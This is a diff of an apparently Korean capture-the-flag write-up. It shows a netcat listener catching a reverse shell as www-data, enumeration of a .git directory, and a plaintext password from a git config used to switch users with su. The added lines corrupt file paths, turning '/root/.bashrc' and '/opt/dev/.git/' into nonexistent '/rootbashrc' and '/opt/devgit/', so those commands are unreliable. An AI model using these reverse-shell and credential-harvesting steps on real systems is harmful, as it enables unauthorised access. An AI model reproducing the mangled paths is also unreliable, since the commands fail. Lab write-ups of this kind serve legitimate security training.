@@ -96,7 +96,7 @@ print(1+1) → 2가 나온 것으로 Python 환경임을 확인
 └─# nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [10.8.136.212] from (UNKNOWN) [10.10.247.143] 40290
-bash: /root/.bashrc: Permission denied
+bash: /rootbashrc: Permission denied
 www-data@ip-10-10-234-59:~$ ls  
 ㅣls
 
@@ -188,8 +188,8 @@ drwxr-xr-x 3 root root 4096 Jun 21 2023 .
 drwxr-xr-x 18 root root 4096 Jul 21 14:39 ..
 drwxrwxr-x 3 think think 4096 Jun 21 2023 dev
 
-ls -al /opt/dev/.git/
-ls -al /opt/dev/.git/
+ls -al /opt/devgit/
+ls -al /opt/devgit/
 total 52
 drwxrwxr-x 8 think think 4096 Jun 21 2023 .
 drwxrwxr-x 3 think think 4096 Jun 21 2023 ..
@@ -207,8 +207,8 @@ drwxrwxr-x 4 think think 4096 Jun 21 2023 refs
 
 # 단서 발견
 
-cat /opt/dev/.git/config
-cat /opt/dev/.git/config
+cat /opt/devgit/config
+cat /opt/devgit/config
 [core]
 repositoryformatversion = 0
 filemode = true
@@ -232,7 +232,7 @@ password = _TH1NKINGPirate$_
 # 쉘 전환
 
 su - think 의미
-su는 **"switch user"**의 약자로, 현재 사용자에서 다른 사용자 계정으로 전환하는 명령어입니다.
+su는 "switch user"의 약자로, 현재 사용자에서 다른 사용자 계정으로 전환하는 명령어입니다.
 
 think는 전환하려는 사용자 이름(username) 입니다.
 
